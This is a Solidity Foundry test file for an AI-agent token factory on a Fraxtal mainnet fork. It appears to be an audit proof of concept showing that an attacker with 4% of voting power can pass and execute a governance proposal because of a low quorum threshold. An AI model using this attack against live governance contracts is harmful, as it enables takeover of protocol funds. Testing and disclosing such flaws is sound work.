// SPDX-License-Identifier: ISC
pragma solidity >=0.8.25 <0.9.0;

import {Test} from "forge-std/src/Test.sol";
import {console} from "forge-std/src/console.sol";
import {AgentFactory} from "../src/AgentFactory.sol";
import {TokenGovernor} from "../src/TokenGovernor.sol";
import {Agent} from "../src/Agent.sol";
import {AIToken} from "../src/AIToken.sol";
import {BootstrapPool} from "../src/BootstrapPool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {LiquidityManager} from "../src/LiquidityManager.sol";

contract TokenGovernorTest is Test {
    IERC20 currencyToken = IERC20(0xFc00000000000000000000000000000000000001);
    address whale = 0x00160baF84b3D2014837cc12e838ea399f8b8478;
    address badActor = address(0xBADBEEF);
    Agent agent;
    AIToken token;
    AgentFactory factory;
    BootstrapPool bootstrapPool;
    LiquidityManager manager;
    TokenGovernor governor;

    function setUpFraxtal(uint256 _block) public {
        vm.createSelectFork(vm.envString("FRAXTAL_MAINNET_URL"), _block);
    }

    function setUp() public {
        setUpFraxtal(12_918_968);
        uint256 creationFee = 15e18;
        uint256 tradingFee = 100; //1%
        uint256 initialSwap = 100e18;
        factory = new AgentFactory(currencyToken, 0);
        factory.setAgentBytecode(type(Agent).creationCode);
        factory.setGovenerBytecode(type(TokenGovernor).creationCode);
        factory.setLiquidityManagerBytecode(type(LiquidityManager).creationCode);
        factory.setTargetCCYLiquidity(1000e18);
        factory.setInitialPrice(0.1e18);
        factory.setTradingFee(tradingFee);
        factory.setCreationFee(creationFee);
        factory.setDefaultProxyImplementation(address(new DefaultProxy()));
        vm.startPrank(whale);
        currencyToken.approve(address(factory), creationFee + initialSwap);
        agent = factory.createAgent("AIAgent", "AIA", "https://example.com", initialSwap);
        token = AIToken(address(agent.token()));

        // Buy from the bootstrap pool
        manager = LiquidityManager(factory.agentManager(address(agent)));
        bootstrapPool = manager.bootstrapPool();
        currencyToken.approve(address(bootstrapPool), 10_000_000e18);
        bootstrapPool.buy(6_000_000e18);
        vm.stopPrank();

        vm.warp(block.timestamp + 1);

        governor = TokenGovernor(payable(agent.owner()));
        console.log("votingDelay:", governor.votingDelay());
    }

    function test_AttackLowQuorumThreshold() public {
        // Setup agent
        factory.setAgentStage(address(agent), 1);
    
        // Setup an attacker with 4% of voting power
        // Transfer from the whale that has 37% of tokens
        vm.startPrank(whale);
        address attacker = makeAddr("attacker");
        uint256 fourPercentSupply = token.totalSupply() * 4 / 100;
        token.transfer(attacker, fourPercentSupply);
    
        // Delegate attacker tokens to themselves
        vm.startPrank(attacker);
        token.delegate(attacker);
    
        // Make a malicious proposal with 4% of votes (0.01% needed)
        vm.warp(block.timestamp + 1);
        address[] memory targets = new address[](1);
        targets[0] = address(666);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        string memory description = "";
        uint256 nonce = governor.propose(targets, values, calldatas, description);
    
        // Cast vote with 4% voting power
        vm.warp(block.timestamp + governor.votingDelay() + 1);
        governor.castVote(nonce, 1);
    
        // Warp to the end of the voting period
        // It can be assessed that with a total votes of 100 Million, the quorum is only 4 Million
        // The voting power of the attacker can be as low as 4 Million (4%)
        vm.warp(block.timestamp + governor.votingPeriod());
        console.log();
        console.log("totalVotes:       ", token.getPastTotalSupply(block.timestamp - 1));
        console.log("quorum:           ", governor.quorum(block.timestamp - 1));
        console.log("votingPower:      ", governor.getVotes(attacker, block.timestamp - 1));
    
        // The proposal succeeds with only 4% of voting power (lower than the expected 25% quorum)
        governor.execute(targets, values, calldatas, keccak256(abi.encodePacked(description)));
        console.log("ATTACK SUCCEEDED WITH ONLY 4% OF VOTES");
        vm.stopPrank();
    }

}

contract AirdropAgent is Agent {
    constructor(
        string memory name,
        string memory symbol,
        string memory url,
        address _factory
    ) Agent(name, symbol, url, _factory) {}

    function airdropTokens(address[] memory _recipients, uint256 _amount) public onlyOwner {
        for (uint256 i = 0; i < _recipients.length; ++i) {
            IERC20(token).transfer(_recipients[i], _amount);
        }
    }

    function hello() public pure returns (string memory) {
        return "Hello";
    }
}

contract DefaultProxy {}
